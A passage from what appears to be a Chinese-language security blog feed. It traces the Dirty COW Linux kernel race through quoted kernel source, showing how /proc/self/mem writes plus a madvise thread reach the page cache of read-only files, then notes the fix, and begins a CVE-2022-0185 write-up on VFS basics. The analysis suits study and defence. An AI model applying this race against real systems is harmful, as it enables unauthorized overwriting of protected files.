page);<br><span class="hljs-number">2816</span>     entry = mk_pte(page, vma-&gt;vm_page_prot);<br><span class="hljs-number">2817</span>     <span class="hljs-keyword">if</span> (write)<br>     <span class="hljs-comment">/* 这里注意带了个脏位 */</span><br><span class="hljs-number">2818</span>         entry = maybe_mkwrite(pte_mkdirty(entry), vma);<br><span class="hljs-number">2819</span>     <span class="hljs-keyword">if</span> (anon) &#123;<br><span class="hljs-number">2820</span>         inc_mm_counter_fast(vma-&gt;vm_mm, MM_ANONPAGES);<br><span class="hljs-number">2821</span>         page_add_new_anon_rmap(page, vma, address);<br><span class="hljs-number">2822</span>     &#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-number">2823</span>         inc_mm_counter_fast(vma-&gt;vm_mm, MM_FILEPAGES);<br><span class="hljs-number">2824</span>         page_add_file_rmap(page);<br><span class="hljs-number">2825</span>     &#125;   <br><span class="hljs-number">2826</span>     set_pte_at(vma-&gt;vm_mm, address, pte, entry);<br><span class="hljs-number">2827</span>         <br><span class="hljs-number">2828</span>     <span class="hljs-comment">/* no need to invalidate: a not-present page won&#x27;t be cached */</span><br><span class="hljs-number">2829</span>     update_mmu_cache(vma, address, pte);<br><span class="hljs-number">2830</span> &#125;<br></code></pre></td></tr></table></figure><p>由于我们传入的参数当中是写错误，所以这里会调用 <code>maybe_mkwrite</code>或者写入可写位，这里继续跟进</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">572</span> <span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">pte_t</span> <span class="hljs-title function_">maybe_mkwrite</span><span class="hljs-params">(<span class="hljs-type">pte_t</span> pte, <span class="hljs-keyword">struct</span> vm_area_struct *vma)</span>                <br>573 &#123;   <br><span class="hljs-number">574</span>     <span class="hljs-keyword">if</span> (likely(vma-&gt;vm_flags &amp; VM_WRITE))<br><span class="hljs-number">575</span>         pte = pte_mkwrite(pte);<br><span class="hljs-number">576</span>     <span class="hljs-keyword">return</span> pte;<br><span class="hljs-number">577</span> &#125;       <br></code></pre></td></tr></table></figure><p>可以看到，如果说我们的vm_flags存在可写标识，那么就会将该pte的可写位置上，否则就不管，现在大火可能懂了为什么是“或者写“了，经过这一段操作，会制造成下面这种情况</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/c9fcc3cec3fdfc03ec6fde8e923f8794a4c226f4.jpg"></p><h2 id="第二次page-fault"><a href="#第二次page-fault" class="headerlink" title="第二次page fault"></a>第二次page fault</h2><p>从上面的 <code>do_cow_fault</code>函数一路返回0,然后再次到达 <code>__get_user_pages</code>函数的retry部分，再一次调用 <code>follow_page_mask</code>函数来寻找pte,当我们一路走到 <code>follow_page_pte</code>函数的时候，这时会有个判断</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">95 </span>    <span class="hljs-keyword">if</span> ((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte)) &#123;<br><span class="hljs-symbol">96 </span>        pte_unmap_unlock(ptep, ptl);<br><span class="hljs-symbol">97 </span>        <span class="hljs-keyword">return</span> NULL;<br><span class="hljs-symbol">98 </span>    &#125;     <br></code></pre></td></tr></table></figure><p>我们此时传入的flags仍然带有 <code>FOLL_WRITE</code>参数，然后他会检查我们刚刚创建的pte是否有可写标识，但看我们上面的图是明显没有的，因此这里会再次返回NULL,我们即将迎来第二次page fault</p><p>而此次根据我们pte的标识，进入 <code>handle_page_pte</code>函数最终会走到下面这一段，调用 <code>do_wp_page</code></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">3309 </span>    <span class="hljs-keyword">if</span> (flags &amp; FAULT_FLAG_WRITE) &#123;                                                     <br><span class="hljs-symbol">3310 </span>        <span class="hljs-keyword">if</span> (!pte_write(entry))<br><span class="hljs-symbol">3311 </span>            <span class="hljs-keyword">return</span> do_wp_page(mm, vma, address,<br><span class="hljs-symbol">3312 </span>                    pte, pmd, ptl, entry);<br><span class="hljs-symbol">3313 </span>        entry = pte_mkdirty(entry);<br><span class="hljs-symbol">3314 </span>    &#125;<br></code></pre></td></tr></table></figure><p>由于我们的页面是可交换和重用的，然后会调用到下面的这一段，这一段是 <code>do_wp_page</code>的一部分</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">2330 </span>        <span class="hljs-keyword">if</span> (reuse_swap_page(old_page)) &#123;<br><span class="hljs-symbol">2331 </span>            /*<br><span class="hljs-symbol">2332 </span>             * The page is all ours.  Move it <span class="hljs-keyword">to</span> our anon_vma so<br><span class="hljs-symbol">2333 </span>             * the rmap code will <span class="hljs-keyword">not</span> search our parent <span class="hljs-keyword">or</span> siblings.<br><span class="hljs-symbol">2334 </span>             * Protected against the rmap code by the page lock.<br><span class="hljs-symbol">2335 </span>             */<br><span class="hljs-symbol">2336 </span>            page_move_anon_rmap(old_page, vma, address);<br><span class="hljs-symbol">2337 </span>            unlock_page(old_page);<br><span class="hljs-symbol">2338 </span>            <span class="hljs-keyword">return</span> wp_page_reuse(mm, vma, address, page_table, ptl,                     <br><span class="hljs-symbol">2339 </span>                         orig_pte, old_page, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><span class="hljs-symbol">2340 </span>        &#125;<br></code></pre></td></tr></table></figure><p>然后我们再看 <code>wp_page_reuse</code>函数，注意到这里的返回值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1993</span> <span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">wp_page_reuse</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mm_struct *mm,</span><br><span class="hljs-params"><span class="hljs-number">1994</span>             <span class="hljs-keyword">struct</span> vm_area_struct *vma, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address,</span><br><span class="hljs-params"><span class="hljs-number">1995</span>             <span class="hljs-type">pte_t</span> *page_table, <span class="hljs-type">spinlock_t</span> *ptl, <span class="hljs-type">pte_t</span> orig_pte,</span><br><span class="hljs-params"><span class="hljs-number">1996</span>             <span class="hljs-keyword">struct</span> page *page, <span class="hljs-type">int</span> page_mkwrite,</span><br><span class="hljs-params"><span class="hljs-number">1997</span>             <span class="hljs-type">int</span> dirty_shared)</span><br>1998     __<span class="hljs-title function_">releases</span><span class="hljs-params">(ptl)</span><br>1999 &#123;<br>.....<br><span class="hljs-number">2041</span>     <span class="hljs-keyword">return</span> VM_FAULT_WRITE;<br><span class="hljs-number">2042</span> &#125;<br></code></pre></td></tr></table></figure><p>这个返回值是关键，这里一路返回到 <code>faultin_page</code>函数，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">295</span> <span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">faultin_page</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *tsk, <span class="hljs-keyword">struct</span> vm_area_struct *vma,</span><br><span class="hljs-params"><span class="hljs-number">296</span>         <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *flags, <span class="hljs-type">int</span> *nonblocking)</span><br>297 &#123;<br><br>  ........<br><span class="hljs-number">345</span>     <span class="hljs-comment">/*</span><br><span class="hljs-comment">346      * The VM_FAULT_WRITE bit tells us that do_wp_page has broken COW when</span><br><span class="hljs-comment">347      * necessary, even if maybe_mkwrite decided not to set pte_write. We</span><br><span class="hljs-comment">348      * can thus safely do subsequent page lookups as if they were reads.</span><br><span class="hljs-comment">349      * But only do so when looping for pte_write is futile: in some cases</span><br><span class="hljs-comment">350      * userspace may also be wanting to write to the gotten user page,</span><br><span class="hljs-comment">351      * which a read fault here might prevent (a readonly page might get</span><br><span class="hljs-comment">352      * reCOWed by userspace write).</span><br><span class="hljs-comment">353      */</span><br><span class="hljs-number">354</span>     <span class="hljs-keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))<br><span class="hljs-number">355</span>         *flags &amp;= ~FOLL_WRITE;<br><span class="hljs-number">356</span>     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-number">357</span> &#125;<br><br></code></pre></td></tr></table></figure><p>可以看到他是将我们传递的flags的 <code>FOLL_WRITE</code>标志位给去掉了，还记得我们最初的标志位吗 <code>FOLL_GET|FOLL_WRITE|FOLL_FORCE</code></p><p>然后我们继续返回0,此时再一次准备 <code>__get_user_pages</code>的 <code>retry</code>部分，但是这里注意，我们的第二个线程实际上在悄悄偷跑，接下来就真正涉及到了条件竞争的利用</p><h2 id="第三次page-fault"><a href="#第三次page-fault" class="headerlink" title="第三次page fault"></a>第三次page fault</h2><p>由於這是我們再一次到達__get_user_pages函數的retry,如下</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">503 </span>retry:<br><span class="hljs-symbol">504 </span>        /*<br><span class="hljs-symbol">505 </span>         * <span class="hljs-keyword">If</span> we have a pending SIGKILL, don<span class="hljs-comment">&#x27;t keep faulting pages and</span><br><span class="hljs-symbol">506 </span>         * potentially allocating memory.<br><span class="hljs-symbol">507 </span>         */<br><span class="hljs-symbol">508 </span>        <span class="hljs-keyword">if</span> (unlikely(fatal_signal_pending(current)))<br><span class="hljs-symbol">509 </span>            <span class="hljs-keyword">return</span> i ? i : -ERESTARTSYS;<br><span class="hljs-symbol">510 </span>        cond_resched();<br><span class="hljs-symbol">511 </span>        page = follow_page_mask(vma, start, foll_flags, &amp;page_mask);<br><span class="hljs-symbol">512 </span>        <span class="hljs-keyword">if</span> (!page) &#123;<br><span class="hljs-symbol">513 </span>            <span class="hljs-keyword">int</span> ret;<br><span class="hljs-symbol">514 </span>            ret = faultin_page(tsk, vma, start, &amp;foll_flags,<br><span class="hljs-symbol">515 </span>                    nonblocking);<br><span class="hljs-symbol">516 </span>            switch (ret) &#123;<br><span class="hljs-symbol">517 </span>            case <span class="hljs-number">0</span>:<br><span class="hljs-symbol">518 </span>                <span class="hljs-keyword">goto</span> retry;<br><span class="hljs-symbol">519 </span>            case -EFAULT:<br><span class="hljs-symbol">520 </span>            case -ENOMEM:<br></code></pre></td></tr></table></figure><p>這裏有一個 <code>cond_resched</code>函數，該函數會將CPU交給寧外一個任務，這裏就導致了我們的條件競爭，如果說這裏我們的第二各線程調用madvise系統調用，並帶上 <code>DONTNEED</code>參數，他會將對應的內存映射解除，所謂映射解除，也就僅僅是將我們的pte解除綁定而已，如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/e850352ac65c10385d6ff6f4f4119313b07e89f6.jpg"></p><p>然後我們繼續進入 <code>follow_page_mask-&gt;follow_page_pte</code>函數，此時我們可以知道map映射是存在pte的，且標誌位爲 <code>rdonly和dirty</code>，並且我們訪問的flags由於消除掉了 <code>FOLL_WRITE</code>，這樣會導致他變爲 <code>FOLL_GET|FOLL_FORCE</code>,並且注意這裏的pte PRSENT位也消失掉，這是因爲你物理映射都沒了，你這個pte也應該標識爲沒用，所以這裏我們的 <code>follow_page_mask</code>函數仍然返回空，這裏會進入到第三次缺頁錯誤，調用 <code>faultin_page</code>函數</p><p>但是這一次的page fault同之前有區別，區別在與我們的flags並不帶上 <code>FOLL_WRITE</code>，這裏說明了並不是寫操作，那除了寫不就是read?</p><p>實際情況跟我們想得一樣，我們會依次調用</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">faultin<span class="hljs-emphasis">_page</span><br><span class="hljs-emphasis">handle_mm_fault</span><br><span class="hljs-emphasis">__handle_mm_fault</span><br><span class="hljs-emphasis">handle_pte_fault</span><br><span class="hljs-emphasis">do_fault</span><br><span class="hljs-emphasis">do_read_</span>fault<br></code></pre></td></tr></table></figure><p>而既然我們現在是寫轉讀，內核發現這是各讀請求，那就沒必要進行COW,直接將page cache中對應文件的page頁面直接返回，然後我們再次回到 <code>__get_user_pages</code>函數，此時返回的page直接就是我們的page cache,然後再調用kmap來在內核進行映射，然後緊接着進行 <code>__access_remote_vm</code>的過程</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/63d9f2d3572c11df7c758715252762d0f703c264.jpg"></p><p>這樣當我們寫操作直接將會寫入page cache,並且在最後會由於 <code>kernel page table</code>的頁表項存在髒位，這也會導致在某次磁盤同步的時候將對應修改的文件寫會到磁盤，這也導致了我們對於一個僅僅可讀的文件寫入的Dirty COW漏洞</p><h1 id="3-修復"><a href="#3-修復" class="headerlink" title="3.修復"></a>3.修復</h1><p><a href="https://bugzilla.suse.com/attachment.cgi?id=697810&action=diff">Dirty Cow 補丁</a></p><p>這裏添加了名爲 <code>FOLL_COW</code>的新標識爲，使得我們在調用 <code>do_wp_fault</code>函數之後會使得他並不清除掉 <code>FOLL_WRITE</code>位，而是新增一個標記爲 <code>FOLL_COW</code>用來標識該頁面是一個COW頁，這樣就可以使得我們之後不會以讀的請求來調用 <code>faultin_page</code>函數</p><p>有同學或許可能有疑問，既然我們的 <code>/proc/self/mem</code>函數已經可以寫入進程所映射到的可讀空間了，那爲什麼還要第二各madvise線程呢，這是因爲雖然我們可以確實修改進程當中所映射到的文件物理內存，但這個物理內存是通過COW獲取道德新物理內存，他並不會再寫回到文件系統，而是隨着進程運行完畢而消失～ ，而調用第二個線程可以使得我們直接操作page cache當中直接映射到的文件頁面，並且由於kmap自動爲內核頁表項帶上RD&#x2F;WR位和dirty位，這使得在之後的同步階段會將這個物理地址寫回到磁盤</p>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>Linux</tag>
      
      <tag>Kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2022-0185漏洞复现</title>
    <link href="/2023/10/10/CVE-2022-0185/"/>
    <url>/2023/10/10/CVE-2022-0185/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2022-0185"><a href="#CVE-2022-0185" class="headerlink" title="CVE-2022-0185"></a>CVE-2022-0185</h1><p>算是第一次进行Linux的漏洞分析，其中还是有许多不足，复现还有几种手法没实现完全</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/77c6a7efce1b9d16e4308055b5deb48f8c54640a.jpg"></p><h1 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h1><p><img src="http://imgsrc.baidu.com/forum/pic/item/9f2f070828381f304cb1979def014c086e06f05e.jpg"></p><p>由<a href="https://www.willsroot.io/2022/01/cve-2022-0185.html">BitsByWill</a>大师提出，以此赢得了31337刀的奖金(但看评论好像本来是50K，最后起了点矛盾降价惹)以及成功在google kctf中实现容器逃逸</p><p>整个漏洞利用了VFS中 <code>fsconfig</code>某个参数实现的函数过程当中的一个整形溢出来实现越界写，其中利用手法也是十分精彩，原作者博客是利用到他曾经在 corctf2021上出的一道 <a href="https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html"><code>fire of selvation</code></a>，此外作者好朋友D3V17也在当年出了同样一道题目，但是难度会在前面的题更大，<a href="https://syst3mfailure.io/wall-of-perdition/"><code>wall of perdition</code></a>,其中便是使用 <code>msg_msg</code>搭配 <code>userfaultfd</code>来实现任意写或者读，而为了应用到本次漏洞，考虑到高版本userfaultfd无法为普通用户使用，所以让 <code>FUSE</code>来代替 <code>userfaultfd</code>，一般前者不会在CTF赛事当中出现，他需要在有着完备的环境条件才可使用，就比如说真机，而 <code>BitesByWill</code>师傅也顺便写了一个简单的fuse库来辅助利用orz</p><h1 id="二、文件系统基础知识"><a href="#二、文件系统基础知识" class="headerlink" title="二、文件系统基础知识"></a>二、文件系统基础知识</h1><h2 id="1-VFS基本概念"><a href="#1-VFS基本概念" class="headerlink" title="1.VFS基本概念"></a>1.VFS基本概念</h2><p>早就听说过虚拟文件系统的大名，网上的解释如下：</p><blockquote><p>VFS（Virtual Filesystem Switch）称为虚拟文件系统或虚拟文件系统转换，是一个内核软件层，在具体的文件系统之上抽象的一层，用来处理与Posix文件系统相关的所有调用，表现为能够给各种文件系统提供一个通用的接口，使上层的应用程序能够使用通用的接口访问不同文件系统，同时也为不同文件系统的通信提供了媒介</p></blockquote><p>从概念上来看其实十分的简单易懂,也就是类似开发中的面向接口编程了,他为不同的文件系统定义了一个普遍的接口,所以不同文件系统只需要按照这个规定好的接口来构造即可,具体实现部分可以按照自己的思路来</p><p>在我们的oS当中,整体布局可以用下面这个图来表示,CSDN找的,侵删.不得不说这个图画的十分的好,我就自己不献丑了</p><p><img src="https://img-blog.csdn.net/20180318233241252?watermark/2/text/Ly9ibG9nLmNzZG4ubmV0L3UwMTA0ODc1Njg=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p>平常我们所使用的系统调用也是第一先经过VFS,通过他提供的接口来进行系统调用的操作,当然具体实现还是看底层真正存在的文件系统类型了,但是在用户层程序员的眼中看来并无太大区别,由于不同文件系统的多样性和用户系统调用的复杂性,VFS文件系统这一抽象层的存在是十分具有存在意义的.</p><h2 id="2-VFS抽象接口"><a href="#2-VFS抽象接口" class="headerlink" title="2.VFS抽象接口"></a>2.VFS抽象接口</h2><p>上述示例中提到VFS也有自己的文件模型，用来支持操作系统的系统调用。下面是VFS抽象模型支持的所有Linux系统调用：</p><ul><li>文件系统相关：mount, umount, umount2, sysfs,  statfs,  fstatfs,  fstatfs64, ustat</li><li>目录相关：chroot，pivot_root，chdir，fchdir，getcwd，mkdir，rmdir，getdents，getdents64，readdir，link，unlink，rename，lookup_dcookie</li><li>链接相关：readlink，symlink</li><li>文件相关：chown， fchown，lchown，chown16，fchown16，lchown16，hmod，fchmod，utime，stat，fstat，lstat，acess，oldstat，oldfstat，oldlstat，stat64，lstat64，lstat64，open，close，creat，umask，dup，dup2，fcntl， fcntl64，select，poll，truncate，ftruncate，truncate64，ftruncate64，lseek，llseek，read，write，readv，writev，sendfile，sendfile64，readahead</li></ul><h2 id="3-VFS-Common-File-Model"><a href="#3-VFS-Common-File-Model" class="headerlink" title="3.VFS Common File Model"></a>3.VFS Common File Model</h2><p>就是说文件系统的抽象化模型,在我们硬盘之中,扇区普遍设置为512字节,而我们内存与硬盘的交互是十分缓慢的,所以一般数据交换并不以扇区(sectors)为单位,而是以块(block)为单位,块一般为4KB大小</p><p>硬盘中文件系统就是用来存放文件信息的,其中不仅有文件类容,还需要存放一些关于文件的信息,例如说文件归属,文件权限等,因此在文件系统中会存放inode节点,在之前自己实现的OS当中是存放了文件数据的扇区号等等用来方便访问.我们最初的open系统调用实际上就是将inode节点从硬盘转到内存了而已.</p><p>文件系统中定义了四个较为重要的对象,他们合在一起便构建了我们的统一文件模型,接下来分别介绍他们</p><h3 id="1-Superblock"><a href="#1-Superblock" class="headerlink" title="1.Superblock"></a>1.Superblock</h3><p>超级块,Unix的特色,里面存放了一系列我们需要使用的元信息,相当于是一个统筹全局的资料库</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/d058ccbf6c81800a8f226cc8f43533fa838b4735.jpg"></p><p>他的数据结构体被存放于<code>include/linux/fs.h</code>中,大家有兴趣可以详细查看</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">super_block</span> &#123;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">list_head</span>s_list;<span class="hljs-comment">/* Keep this first */</span> <span class="hljs-comment">//链接各超级块</span><br><span class="hljs-type">dev_t</span>s_dev;<span class="hljs-comment">/* search index; _not_ kdev_t */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>s_blocksize_bits;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>s_blocksize;<br><span class="hljs-type">loff_t</span>s_maxbytes;<span class="hljs-comment">/* Max file size */</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">file_system_type</span>*s_type;<br><span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">super_operations</span>*s_op; <span class="hljs-comment">//操作文件系统的函数指针</span><br><span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">dquot_operations</span>*dq_op;<br><span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">quotactl_ops</span>*s_qcop;<br><span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">export_operations</span> *s_export_op;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>s_flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>s_iflags;<span class="hljs-comment">/* internal SB_I_* flags */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>s_magic;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">dentry</span>*s_root; <span class="hljs-comment">//根目录入口点</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">rw_semaphore</span>s_umount;<br><span class="hljs-type">int</span>s_count;<br><span class="hljs-type">atomic_t</span>s_active;<br><br>...<br><br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure><p>一般我们的超级块都会存放在该文件系统的头部,由于linux一般可以挂在多个文件系统,所以这个超级块的<code>s_list</code>字段就是用来链接下一个超级快</p><h3 id="2-inode"><a href="#2-inode" class="headerlink" title="2.inode"></a>2.inode</h3><p>他标识了一个存在于硬盘中的文件，他在内存当中是以VFS inode存在，在硬盘中则可能有些许不同，可能包含了存放在硬盘中不需要的一些字段，可能有某种不以inode进行管理的文件系统，<del>说的就是你们，FAT和Reiserfs</del>，VFS的处理方式就是将其中的特定信息赋值给内存中的inode</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Keep mostly read-only and often accessed (especially for</span><br><span class="hljs-comment"> * the RCU path lookup and &#x27;stat&#x27; data) fields at the beginning</span><br><span class="hljs-comment"> * of the &#x27;struct inode&#x27;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">inode</span> &#123;<br><span class="hljs-type">umode_t</span>i_mode;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">short</span>i_opflags;<br><span class="hljs-type">kuid_t</span>i_uid;<br><span class="hljs-type">kgid_t</span>i_gid;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>i_flags;<br><br>...<br><br>&#125; __randomize_layout;<br><br></code></pre></td></tr></table></figure><h3 id="3-dentry"><a href="#3-dentry" class="headerlink" title="3.dentry"></a>3.dentry</h3><p>目录项缓存，Linux使用它来快速访问此前的查找操作的结果。在VFS连同文件系统实现读取的一个目录项（目录或文件）的数据之后，则创建一个dentry实例，以缓存找到的数据，这样下次我们寻找该文件&#x2F;目录则会首先从该缓存找起，而不是再次通过文件名来到查找相应目录项了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">dentry</span> &#123;<br><span class="hljs-comment">/* RCU lookup touched fields */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> d_flags;<span class="hljs-comment">/* protected by d_lock */</span><br><span class="hljs-type">seqcount_spinlock_t</span> d_seq;<span class="hljs-comment">/* per dentry seqlock */</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">hlist_bl_node</span> d_hash;<span class="hljs-comment">/* lookup hash list */</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">dentry</span> *d_parent;<span class="hljs-comment">/* 父目录 */</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">qstr</span> d_name;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">inode</span> *d_inode;<span class="hljs-comment">/* 该文件名所属inode，如果不存在则为NULL */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> d_iname[DNAME_INLINE_LEN];<span class="hljs-comment">/* small names */</span><br><br><span class="hljs-comment">/* Ref lookup also touches following */</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">lockref</span> d_lockref;<span class="hljs-comment">/* per-dentry lock and refcount */</span><br><span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">dentry_operations</span> *d_op;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">super_block</span> *d_sb;<span class="hljs-comment">/* The root of the dentry tree */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> d_time;<span class="hljs-comment">/* used by d_revalidate */</span><br><span class="hljs-type">void</span> *d_fsdata;<span class="hljs-comment">/* fs-specific data */</span><br><br><span class="hljs-keyword">union</span> &#123;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">list_head</span> d_lru;<span class="hljs-comment">/* LRU list */</span><br><span class="hljs-type">wait_queue_head_t</span> *d_wait;<span class="hljs-comment">/* in-lookup ones only */</span><br>&#125;;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">list_head</span> d_child;<span class="hljs-comment">/* child of parent list */</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">list_head</span> d_subdirs;<span class="hljs-comment">/* our children */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * d_alias and d_rcu can share memory</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">union</span> &#123;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">hlist_node</span> d_alias;<span class="hljs-comment">/* inode alias list */</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">hlist_bl_node</span> d_in_lookup_hash;<span class="hljs-comment">/* only for in-lookup ones */</span><br> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">rcu_head</span> d_rcu;<br>&#125; d_u;<br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure><h2 id="4-传统mount系统调用"><a href="#4-传统mount系统调用" class="headerlink" title="4.传统mount系统调用"></a>4.传统mount系统调用</h2><p>我们平时都会使用mount系统调用来挂在某一文件系统，我们可以查看一下Linux手册</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 